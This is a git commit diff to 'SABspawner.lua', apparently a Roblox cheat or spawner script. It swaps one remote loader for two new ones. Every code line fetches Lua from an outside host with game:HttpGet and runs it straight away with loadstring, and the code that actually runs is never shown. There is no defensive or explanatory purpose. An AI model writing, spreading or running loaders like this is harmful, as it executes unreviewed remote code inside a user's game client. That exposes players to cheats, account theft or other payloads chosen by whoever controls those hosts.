2d9921e6a240002910f16b87054d589a7fa5d06b
CodeCrackerXGaming <datfardcatyt@gmail.com>
2026-03-27 12:45:09 -0400

    Update CLIENT_ID and load scripts from new URLs

--- SABspawner.lua
+++ SABspawner.lua
@@ -1,3 +1,3 @@
-CLIENT_ID = "495862e129cc449b"
-GAME = "sab"
-loadstring(game:HttpGet("http://d20.aurorix.net:25701/script/sab"))()
+ID="e2b53e43-797d-412c-9476-22f4ef5a6d8e";
+RUN_AFTER=loadstring(game:HttpGet("https://cdn.project-reverse.org/get_any_brainrot.luau"));
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
